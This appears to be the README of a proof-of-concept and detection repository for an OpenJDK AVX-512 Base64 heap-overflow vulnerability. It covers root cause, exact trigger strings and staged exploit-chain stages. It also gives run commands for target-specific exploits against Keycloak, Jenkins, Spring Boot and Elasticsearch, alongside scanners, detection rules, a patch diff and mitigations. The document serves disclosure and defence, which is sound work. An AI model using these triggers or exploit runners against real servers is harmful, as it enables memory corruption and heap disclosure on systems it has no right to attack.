<p align="center">
  <img src="docs/cover.png" alt="java4shell" width="700">
</p>

<h1 align="center">java4shell</h1>
<p align="center">
  <strong>CVE-2026-114938 — OpenJDK AVX-512 VBMI Base64 Heap Overflow PoC & Detection Toolkit</strong>

---

Memory corruption in OpenJDK HotSpot's AVX-512 VBMI Base64 decoding intrinsic. A malformed 65-byte input (`"A"×64 + "="`) causes an integer underflow in the output mask calculation, producing a full 64-bit write mask. The resulting `VMOVDQU8` writes **62 bytes past the end of the heap buffer**.


## CVE Details

| Field | Value |
|-------|-------|
| **CVE** | CVE-2026-114938 |
| **CVSS v4.0 / v3.1** | 9.2 Critical / 8.1 High |
| **CWE** | CWE-191 (Integer Underflow) → CWE-122 (Heap Buffer Overflow) |
| **Component** | `hotspot/compiler` — `StubGenerator::generate_base64_decodeBlock()` |

## Affected Versions

| JDK | Vulnerable | Fixed |
|-----|-----------|-------|
| 17 | 17.0.6 – 17.0.21 | 17.0.21.1 |
| 21 | All before 21.0.13.1 | 21.0.13.1 |
| 25 | All before 25.0.5.1 | 25.0.5.1 |
| 27 | All before 27.0.1.1 | 27.0.1.1 |

**Hardware requirement:** x86-64 with AVX-512 VBMI — Intel Ice Lake+ (Xeon 3rd Gen+) or AMD Zen 4+ (EPYC Genoa / Ryzen 7000+). **ARM64 is NOT affected.**

All OpenJDK-based distributions are vulnerable: Oracle Java SE, Temurin, Corretto, Zulu, Liberica, SapMachine, Red Hat OpenJDK, GraalVM.

## Impact

**Pre-auth RCE (default configs):**
- Keycloak · Atlassian Jira · Atlassian Confluence · JFrog Artifactory · Jenkins · PingFederate

**Post-auth RCE:**
- Apache Kafka Broker · Apache Solr · Elasticsearch · Gerrit · Spinnaker

**Attack surface:** Any Java application that decodes untrusted Base64 via `java.util.Base64` — HTTP Basic Auth, JWT tokens, SAML assertions, file uploads, API payloads, TLS (client-side).

## Root Cause

```
Input: "A"×64 + "="  (65 bytes)
Buffer: 50 bytes allocated

Tail handler:
  output_size = (1 / 4) * 3 = 0
  output_size -= 1            = -1  (UNDERFLOW)
  bzhiq(-1, 0xFF)             = 0xFFFFFFFFFFFFFFFF  (all bits set)
  evmovdqub [dst+48], mask, zmm → writes ALL 64 bytes
                                → 62 bytes PAST the buffer end
```

The `BZHI` instruction treats the index as `unsigned [7:0]`. When `output_size = -1`, the low byte is `0xFF = 255`, which exceeds the 64-bit register width, so no bits are cleared — full mask → full 64-byte write.

## PoC

The trigger proves the memory corruption is real. It uses a 4096-byte destination array so the overflow stays contained (safe to run).

```bash
cd poc/
javac Base64Trigger.java
java Base64Trigger
```

**Vulnerable output:**
```
runtime=21.0.13+9-LTS
vm=OpenJDK 64-Bit Server VM
rejected=true changed=62 first=50 last=111
REPRODUCED
```

**Verified on:** GCE `c3-standard-4` (Intel Xeon Platinum 8481C, Sapphire Rapids) + Temurin 21.0.13+9-LTS.

### Trigger Strings

| JDK Version | Input |
|-------------|-------|
| 21, 25, 27 | `"A" × 64 + "="` (65 bytes) |
| 17 (17.0.6+) | `"A" × 128 + "="` (129 bytes) |

### Full Verification

```bash
chmod +x poc/verify_corruption.sh
./poc/verify_corruption.sh
```

Tests the bounded trigger, then checks `-XX:-UseBASE64Intrinsics` in a separate process. Java 17 uses the 128-character variant. A negative test is **not** a safety verdict: inherited JVM options, unavailable intrinsics, or JIT behavior can prevent reproduction. The wrapper requires a matching `javac`, uses a private temporary directory and timeouts, and distinguishes errors from valid test output.

Exit codes: `1` = corruption reproduced and the mitigation control passed; `2` = skipped, not reproduced, or inconclusive. This does not inspect or change the running application's configuration. Use only on authorized hosts, in a separate unprivileged process; do not use `exploit/` for production verification.

## Exploit Chain

Staged exploit demonstrating escalation from memory corruption to heap disclosure. Each stage builds on the previous:

| Stage | File | Primitive |
|-------|------|-----------|
| 1 — Writer | `WriterPrimitive.java` | Corrupt adjacent array length → OOB write |
| 2 — JavaBleed | `JavaBleed.java` | Extend reader array → heap disclosure |
| 3 — Feng Shui | `HeapFengShui.java` | G1 TLAB control for reliable placement |
| 4 — Full Chain | `Java4ShellExploit.java` | WARM→SPRAY→TRIGGER→EXTEND→DISCLOSE→REPAIR |
| 5 — Remote | `RemoteExploitSim.java` | HTTP Basic Auth attack vector simulation |

```bash
cd exploit/

# Run the full chain
chmod +x run.sh
./run.sh chain

# Or individual stages
./run.sh writer      # Stage 1: Writer primitive
./run.sh javableed   # Stage 2: Heap disclosure
./run.sh fengshui    # Stage 3: Heap layout control
./run.sh remote      # Stage 5: HTTP attack simulator
./run.sh all         # Everything
```

**Exploitation chain (from Calif disclosure):**
1. **Writer** — 62-byte overflow corrupts adjacent array's length field
2. **Reader ("JavaBleed")** — Writer extends a second array → read heap past bounds
3. **Feng Shui** — G1 GC TLAB manipulation places arrays adjacent in memory
4. **Remote grooming** — TCP ACK timing controls server-side heap allocation order
5. **Full chain** — WARM → REHEARSE → TRIGGER → DISCLOSE → REPAIR → FINISH

Each target needs a bespoke profile (allocation sizes, GC behavior, auth flow). There is no universal exploit.

## Scanner

### Host Scanner

Checks discoverable Java installations in the visible filesystem for version candidates:

```bash
chmod +x scanner/java4shell_scan.sh
./scanner/java4shell_scan.sh
```

Checks all four required guest CPU flags, full four-component version boundaries, and effective `UseBASE64Intrinsics` values using a matching `jcmd`. Nix store paths and visible process executables are included; additional Java binary paths can be passed as arguments. Run within each relevant container namespace with appropriate permissions. Missing tools, permissions or unrecognized versions produce `UNKNOWN`, not `SAFE`. Process command lines are not printed.

Version ranges are triage hints, not authoritative vendor patch detection: verify vendor backports separately. Exit codes: `1` = candidates found; `2` = unknown checks with no candidates; `0` = no candidates found or a missing hardware prerequisite. None of these clears undiscovered/container runtimes, and hardware exclusions apply only to current placement. `timeout` and Bash are required; effective process inspection requires `jcmd` attach permissions and may be unavailable.

### Network Scanner

Probes remote hosts for vulnerable Java versions via HTTP headers, TLS certs, and service banners:

Network results are **hints only**: `CANDIDATE` or `INCONCLUSIVE`, never a confirmed vulnerability or safety verdict. Application-server versions are not JDK versions. JSON retains `vulnerable` as `null` and adds `candidate` and `assessment`; consumers must not treat `null` or lack of findings as safe. The scanner cannot establish CPU eligibility, vendor backports or live mitigation settings.

```bash
# Single host
python3 scanner/java4shell_scan.py --host app.example.com

# CIDR range
python3 scanner/java4shell_scan.py --cidr 10.0.0.0/24 --ports 8080,8443

# From file
python3 scanner/java4shell_scan.py --targets hosts.txt --threads 50

# JSON output
python3 scanner/java4shell_scan.py --host app.example.com --json
```

## Offline regression tests

```bash
python3 -m unittest discover -s tests -v
bash -n scanner/java4shell_scan.sh poc/verify_corruption.sh
```

Tests use synthetic versions, process flags and JVM outcomes; they do not contact target hosts or execute the corruption trigger.

## Detection Rules

Pre-built IDS / WAF / SIEM rules in [`detection/`](detection/):

| File | Format | Signatures |
|------|--------|-----------|
| `java4shell.rules` | Suricata / Snort | 6 rules — malformed Base64, trigger patterns, warm-up, crash indicators |
| `java4shell.yaml` | Sigma | 5 rules — web logs, JVM crashes, GC SIGSEGV, exception floods |
| `modsecurity.conf` | ModSecurity v2/v3 | 6 rules — drop-in for Apache/Nginx |

**Key detection signals:**
- Malformed Base64 padding in `Authorization: Basic` headers (length % 4 ≠ 0)
- Exact trigger patterns (`"A"×64 + "="` or `"A"×128 + "="`)
- High-frequency Base64 auth requests from single source (JIT warm-up phase)
- `IllegalArgumentException` from Base64 decoder (thrown after corruption)
- `hs_err_pid*.log` crash files with `SIGSEGV` in G1 GC / `StubRoutines`

## Quick Start

```bash

# Start the lab (requires x86-64 Docker host with AVX-512 VBMI)
cd lab && chmod +x setup.sh && ./setup.sh

# Enter the container and run the PoC
docker compose exec poc bash
java Base64Trigger

# Or run directly (if Java is installed locally)
cd poc && javac Base64Trigger.java && java Base64Trigger

# Scan your hosts
./scanner/java4shell_scan.sh
```

## Downstream Target Exploits

Target-specific exploit chains for real-world applications. Each module implements:
reconnaissance → multi-threaded JIT warmup → heap grooming → trigger → JavaBleed detection.

| Target | Vector | Grooming Strategy |
|--------|--------|-------------------|
| **Keycloak 26.x** | Token endpoint Basic Auth | `client_id` size variation → TLAB layout control |
| **Jenkins LTS** | Any API endpoint Basic Auth | Multi-endpoint rotation, `tree` depth, Cookie spray |
| **Spring Boot 3.x** | `BasicAuthenticationFilter` | Tomcat `ByteChunk` header-size sweep |
| **Elasticsearch 8.x** | X-Pack `SecurityHttpFilter` | `_bulk` / `_search` / `_cat` allocation patterns |

```bash
cd exploit/downstream/

# All targets (against Docker Compose lab)
python3 exploit_all.py --target all

# Single target with custom URL
python3 exploit_all.py --target keycloak --url http://keycloak:8080 --warmup 10000

# Via runner script
chmod +x run.sh
./run.sh docker          # Against local Docker lab
./run.sh keycloak        # Single target
./run.sh remote keycloak https://keycloak.internal:8443
```

## Repository Structure

```
java4shell-poc/
├── poc/                             # Proof of Concept
│   ├── Base64Trigger.java           #   Memory corruption trigger
│   ├── verify_corruption.sh         #   Full verification + mitigation tests
│   └── run.sh                       #   Quick compile-and-run helper
├── exploit/                         # Exploit Chain
│   ├── WriterPrimitive.java         #   Stage 1: Array length corruption → OOB write
│   ├── JavaBleed.java               #   Stage 2: Heap disclosure via extended reader
│   ├── HeapFengShui.java            #   Stage 3: G1 TLAB heap layout control
│   ├── Java4ShellExploit.java       #   Stage 4: Full 7-phase exploit chain
│   ├── RemoteExploitSim.java        #   Stage 5: HTTP Basic Auth attack simulator
│   ├── run.sh                       #   Stage runner
│   ├── downstream/                  #   Target-specific exploit chains
│   │   ├── framework.py             #     Shared infrastructure (HTTP, analysis, grooming)
│   │   ├── keycloak_exploit.py      #     Keycloak 26.x
│   │   ├── jenkins_exploit.py       #     Jenkins LTS
│   │   ├── springboot_exploit.py    #     Spring Boot 3.x
│   │   ├── elasticsearch_exploit.py #     Elasticsearch 8.x
│   │   └── exploit_all.py           #     Unified runner
│   └── targets/                     #   Docker Compose target lab
│       ├── docker-compose.yml       #     Keycloak + Jenkins + ES + Spring Boot
│       ├── attacker/                #     Python exploit script
│       └── springboot/              #     Custom Spring Boot target app
├── scanner/                         # Scanners
│   ├── java4shell_scan.sh           #   Host scanner (JDK + CPU flags)
│   └── java4shell_scan.py           #   Network scanner (HTTP/TLS/banner)
├── detection/                       # Detection Rules
│   ├── java4shell.rules             #   Suricata / Snort
│   ├── java4shell.yaml              #   Sigma
│   └── modsecurity.conf             #   ModSecurity
├── lab/                             # Lab Environment
│   ├── Dockerfile                   #   Vulnerable JDK container
│   ├── docker-compose.yml           #   Lab setup
│   └── setup.sh                     #   One-click launcher
├── tests/                           # Offline regression tests
├── docs/                            # Documentation
│   ├── ANALYSIS.md                  #   Full technical analysis
│   ├── substack_article_v2.md       #   Published Substack writeup
│   └── cover.png                    #   Cover art
└── README.md
```

```diff
 __ BIND(L_finalBit);
 // Now have 1 to 63 bytes left to decode
+// A padded Base64 tail shorter than one complete block is handled by Java.
+__ cmpl(length, 4);
+__ jcc(Assembler::less, L_bruteForce);
```

Routes tails shorter than 4 bytes to the safe scalar decoder before the BZHI underflow can occur.

## Mitigation

**Upgrade Java immediately** to 17.0.21.1 / 21.0.13.1 / 25.0.5.1 / 27.0.1.1.

```bash
# Interim — disable Base64 intrinsic (recommended, narrow impact)
java -XX:-UseBASE64Intrinsics MyApp

# Interim — disable AVX-512 entirely (x86-64 only — do NOT use on ARM)
java -XX:UseAVX=2 MyApp

# Fleet-wide via environment variable
export JAVA_TOOL_OPTIONS="-XX:-UseBASE64Intrinsics"
```

After upgrading: restart all JVM processes, rebuild container images.

## Comparison

| | Heartbleed | Log4Shell | Spring4Shell | **Java4Shell** |
|---|---|---|---|---|
| **Bug class** | Over-read | Injection | Class manipulation | Integer underflow → heap overflow |
| **Trigger** | TLS heartbeat | `${jndi:…}` | HTTP params | `"A"×64 + "="` |
| **Exploitation** | Trivial | Trivial | Moderate | Complex (heap feng shui) |
| **Universal** | Yes | Yes | Partial | No (per-target + HW-gated) |
| **CVSS** | 7.5 | 10.0 | 9.8 | 9.2 |

## References

- [OpenJDK advisory](https://openjdk.org/groups/vulnerability/advisories/2026-11-17)
- [Oracle CPU](https://www.oracle.com/security-alerts/cspunov2026.html)
- [Datadog Security Labs analysis](https://securitylabs.datadoghq.com/articles/java4shell-remote-code-execution-in-openjdk-cve-2026-114938/)
- [JFrog analysis](https://research.jfrog.com/post/java4shell-vulnerability/)
- [Upwind / java4shell.net](https://java4shell.net/)
